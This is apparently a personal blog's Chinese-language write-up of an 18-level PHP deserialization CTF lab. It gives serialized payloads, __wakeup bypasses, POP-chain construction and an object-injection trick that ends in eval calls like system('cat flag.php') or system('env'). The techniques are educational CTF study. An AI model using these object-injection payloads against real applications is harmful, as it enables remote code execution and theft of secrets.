---
title: PHPSerialize-labs
published: 2026-06-12
description: 咕咕咕
image: "./13.png"
tags: ["CTF"]
category: CTF
draft: false
slug: php-include
---

明天考6级，现在还在发博客？:(((

实在学不进去6级，这次就当捐款了吧

如果说是过应该没什么问题，毕竟四级考了 601 的高分（天赋发力了，但是主要是要6级 500 以上才能免修啊）

感觉我考6级纯粹是为了免修那4个学分...

等 12 月份准备下吧，大二应该不会像现在这么忙了...

## level1

直接实例化类 FLAG

```plain
code=new FLAG();
```

## level2

这里直接给了环境变量，直接读取即可：

```plain
code=echo $flag_string;
```

## level3

这里我们知道有 private 和 protect，private 修饰的属性只能通过类本身读取出来，继承的类不行，而 protect 修饰的属性可以通过其继承下来的类读取出来

```plain
code=echo $target->public_flag . $sub_target->show_protected_flag() . $target->get_private_flag();
```

## level4

题目提示了试试序列化，直接读出：

```plain
code=echo serialize($flag_is_here);
```

得到：

```plain
O:4:"FLAG":3:{s:18:"FLAGflag1_string";s:8:"ser4l1ze";s:18:"FLAGflag2_number";i:2;s:18:"FLAGflag3_object";O:5:"FLAG3":1:{s:25:"FLAG3flag3_object_array";a:2:{i:0;s:3:"se3";i:1;s:2:"me";}}}
```

拼接起来：`ser4l1ze2se3me`

这里解释下，创建对象后会执行 `__construct()`，随后对 `flag3_object` 进行实例化，这个动作发生在最前面，因此我们后面还是能通过 `FLAG` 的实例化读取到 `FLAG3` 中的数据

## level5

这里会对我们的一堆数据输入进行反序列化，我们一一对应先进行序列化即可

(这里拿了 tj 师傅的脚本)
```php
<?php

  

class a_class{

    public $a_value = "HelloCTF";

}

  

$your_object = new a_class();

$your_boolean = true;

$your_NULL = null;

$your_string = "IWANT";

$your_number = 1;

$your_object->a_value = "FLAG";

$your_array = array('a'=>"Plz",'b'=>"Give_M3");

  

$exp = "o=".serialize($your_object)."&s=".serialize($your_string)."&a=".serialize($your_array)."&i=".serialize($your_number)."&b=".serialize($your_boolean)."&n=".serialize($your_NULL);

  

echo $exp;
```

## level6

这里题目要求我们输入的信息进行反序列化后正确输出其对应的字符串

这里我们要注意的是我们构造序列化后它是有不可见字符的，直接复制会长度不对而导致反序列化失败

所以对此我们一般是要使用 `urlencode` 一下再上传

```php
<?php 
class protectedKEY{
    protected $protected_key = "protected_key";
}
class privateKEY{
    private $private_key = "private_key";
}

$exp = "protected_key=".urlencode(serialize(new protectedKEY))."&private_key=".urlencode(serialize(new privateKEY));

echo $exp;
```

## level7

题目会对我们的输入进行反序列化后访问其的 `$flag_command` 属性

这里我们可以对其进行修改后，`$flag_command` 属性就成了我们想要执行的命令了

```php
<?php

class FLAG{

    public $flag_command = "system('tac flag.php');";

}

echo urlencode(serialize(new FLAG()));
```

## level8

这里题目要求我们将一个全局变量 `$flag` 的大小加到 5 以上才能得到 flag

有两个魔术方法与之有关，`__construct` 和 `__destruct`

在 `__construct` 中，每次启用它都会将全局变量 `$flag` 变为 0

随后再进行自增1

在 `__destruct` 中，每次启用都会将全局变量 `$flag` 自增1

所以这里我们目标很明确，尽可能的多摧毁序列化去触发 `__destruct`

这里我们最终的 payload 如下：

```plain
code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));
```

这里关键在于 php 的 GC 机制，可以读读官方文档 --> https://www.php.net/features.gc.refcounting-basics.php

我们创建一个空的，没有具体指向的实例后，计数器对其进行加1，随后，经过序列化后，这个对象便无人使用了，随后计数减1，到0后 php 的 GC 机制便会对其进行清理，摧毁的瞬间就会触发它的 `__destruct` 机制，触发 `$flag` 加1

这里我们要知道，触发 `__construct` 只在创建一个全新的对象时才会触发，因此后续的反序列化过程不会触发 `__construct`

## level9

有 eval 函数，直接构造即可：

```php
<?php
class FLAG {
    var $flag_command = "system('env');";
}
$exp = "o=".urlencode(serialize(new FLAG()));
echo $exp;
```

## level10

这一关是考察的 `__wakeup` 魔术方法，它会在执行反序列化之前被调用，这里我们直接传入即可

```php
<?php
class FLAG{
    function __wakeup() {
        include 'flag.php';
        echo $flag;
    }
}

$exp = 'o='.serialize(new FLAG());
echo $exp;
```

## level11

这里考察了关于 `__wakeup` 魔术方法的 CVE，不过若是看过 hello-ctf 的应该都会（（

```php
<?php
class FLAG {
    public $flag = "FAKEFLAG";

    public function  __wakeup(){
        global $flag;
        $flag = NULL;
    }
    public function __destruct(){
        global $flag;
        if ($flag !== NULL) {
            echo $flag;
        }else
        {
            echo "sorry,flag is gone!";
        }
    }
}

$exp = 'o='.serialize(new FLAG());
echo $exp;
```

最后把标志属性数量的那里加个1即可

## level12

`array_rand — 从数组中随机取出一个或多个单元`

这里已经解释的很清楚了

尝试了看下 FLAG 类和 CHALLENGE 类中的 `$f` 是不是一样的：

```plain
s:1:"f";s:3:"t0_" //challenge
s:7:"FLAGf";s:6:"clean_ //flag
```

顺便说下，这里若是我们要访问私有属性要使用 private 序列化后的方式

```plain
%00父类名称%00变量名
```

这里就用 chance 一直一直查：

```plain
s:1:"h";s:7:"NSSCTF{"
s:1:"e";s:4:"Th3_"
s:1:"l";s:17:"__sleep_function_" //challenge
s:7:"FLAGl";s:3:"up_" //flag
s:1:"I";s:4:"_is_"
s:1:"o";s:7:"called_"
s:1:"c";s:7:"before_"
s:1:"t";s:14:"serialization_"
s:1:"f";s:3:"t0_" //challenge
s:7:"FLAGf";s:6:"clean_" //flag
s:1:"f";s:3:"t0_" //challenge
s:7:"FLAGf";s:6:"clean_" //flag
s:1:"l";s:17:"__sleep_function_" //challenge
s:7:"FLAGl";s:3:"up_" //flag
s:4:"*a";s:4:"4nd_"
s:1:"g";s:17:"select_variab1es}"
```

这里前面的在 challenge 中都有，后面在 flag 中都有，构造后如下：

```plain
NSSCTF{Th3___sleep_function__is_called_before_serialization_t0_clean_up_4nd_select_variab1es}
```

## level13

这里我们直接调用可以触发 `__toString` 的方式即可

```plain
o=echo $obj;
```

## level14

直接调用即可：

```plain
o=$obj(get_flag);
```

## level15

这里我们来分析下这个：

```php
<?php

class A {  
    public $a;  
    public function __construct($a) {        $this->a = $a;  
    }  
}  
class B {  
    public $b;  
    public function __construct($b) {        $this->b = $b;  
    }  
}  
class C {  
    public $c;  
    public function __construct($c) {        $this->c = $c;  
    }  
}  
  
class D {  
    public $d;  
    public function __construct($d) {        $this->d = $d;  
    }  
    public function __wakeUp() {        $this->d->action();  
    }  
}  
  
class destnation {  
    var $cmd;  
    public function __construct($cmd) {        $this->cmd = $cmd;  
    }  
    public function action(){  
        eval($this->cmd->a->b->c);  
    }  
}  
  
if(isset($_POST['o'])) {    unserialize($_POST['o']);  
} else {    highlight_file(__FILE__);  
}
```

关键在于 `destnation` 中的 `eval` 函数，它会顺着 `$this->cmd->a->b->c` 一路向上去

所以我们应该构造从 c 这个末端回溯到 cmd

这里我们可以赋值给 `$c`，就赋值命令：

```php
$c = new C("system('cat flag.php');");
```

随后到 b：

```php
$b = new B($c)
```

随后到 a：

```php
$a = new A($b)
```

随后到 cmd：

```php
$des = new destnation($a);
```

随后我们再到 D 中让 `__wakeup` 方法去执行 `$this->d->action();`，就能成功执行到 `action()` 了

```php
$d =  new D($des);
```

最终 payload：

```php
<?php

  

class A {

    public $a;

    public function __construct($a) {

        $this->a = $a;

    }

}

class B {

    public $b;

    public function __construct($b) {

        $this->b = $b;

    }

}

class C {

    public $c;

    public function __construct($c) {

        $this->c = $c;

    }

}

  

class D {

    public $d;

    public function __construct($d) {

        $this->d = $d;

    }

    public function __wakeUp() {

        $this->d->action();

    }

}

  

class destnation {

    var $cmd;

    public function __construct($cmd) {

        $this->cmd = $cmd;

    }

    public function action(){

        eval($this->cmd->a->b->c);

    }

}

  

$c = new C("system('env');");

$b = new B($c);

$a = new A($b);

$des = new destnation($a);

$d =  new D($des);

  

echo serialize($d);
```

## level16

分析下代码：

```php
<?php

  

class A {

    public $a;

    public function __invoke() {

            include $this->a;

            return $flag;

    }

}

  

class B {

    public $b;

    public function __toString() {

        $f = $this->b;

        return $f();

    }

}

  
  

class INIT {

    public $name;

    public function __wakeUp() {

        echo $this->name.' is awake!';

    }

}

  

if(isset($_POST['o'])) {

    unserialize($_POST['o']);

} else {

    highlight_file(__FILE__);

}
```

这里很明显，我们的最终目标就是使得 A 中的 `__invoke` 被调用

**在 pop 链的构造中，我们通常是通过终点向上**

这里的终点就是 `__invoke` 魔术方法被调用

往上查找，哪里有和函数调用相关的量：

```php
class B {

    public $b;

    public function __toString() {

        $f = $this->b;

        return $f();

    }

}
```

这里我们可以看到调用了 `$f()`，我们要连接起来他们的话可以看到：

`$f = $this->b;`，这里将属性 b 给了 `$f` 

因此我们让 `$b` 等于 A 的一个实例即可，这样 `return $f();` 真实调用的就是 `return (new A())()`，随后成功调用 `__invoke`

随后我们再看，有什么办法能够调用 `__toString`

```php
class INIT {

    public $name;

    public function __wakeUp() {

        echo $this->name.' is awake!';

    }

}
```

这里将 `$name` 打出，因此我们只要将 `$name` 变为 B 类的一个实例即可

最终 payload：

```php
class A {
    public $a='flag.php';
}

class B {
    public $b;
}

class INIT {
    public $name;
}

$a = new A();
$b = new B();
$b->b = $a;
$init = new INIT();
$init->name  = $b;

echo urlencode(serialize($init));
```

## level17

这里我们看代码：

```php
if(isset($_POST['o'])) {    $a = unserialize($_POST['o']);  
    if ($a instanceof A && $a->helloctfcmd == "get_flag") {  
        include 'flag.php';  
        echo $flag;  
    } else {  
        echo "what's rule?";  
    }
```

这里要求我们的 a 是由 A 类创建出来的，即反序列化钱的 o 是 A 的一个实例

随后要 A 中有个属性为它既定的值：

```php
<?php

class A {

    public $helloctfcmd = "get_flag";

}

echo urlencode(serialize(new A()));
```

## level18

审代码：

```php
<?php

highlight_file(__FILE__);  
  
class Demo {  
    public $a = "Hello";  
    public $b = "CTF";  
    public $key = 'GET_FLAG";}FAKE_FLAG';  
}  
  
class FLAG {  
  
}  
  
$serliseStringDemo = serialize(new Demo());  
  
$target = $_GET['target'];  
$change = $_GET['change'];  
  
$serliseStringFLAG = str_replace($target, $change, $serliseStringDemo);  
  
$FLAG = unserialize($serliseStringFLAG);  
  
if ($FLAG instanceof FLAG && $FLAG->key == 'GET_FLAG') {  
    echo $flag;  
}
```

我们的目标是使得 FLAG 是来自 FLAG 类，并且其中要有一个 key 属性值等于 `GET_FLAG`

在序列化和反序列化中，当成员属性的数量，名称长度，内容长度均一致时，程序会以 ";}" 作为字符串的结尾判定

题目给了我们可以定义的替换字符

最终 payload：

```php
?target[]=Demo&target[]=20&change[]=FLAG&change[]=8
```

这里我们执行了将 `Demo` 换为 `Flag`，并且将 20 换为了 8（使用数组进行交换）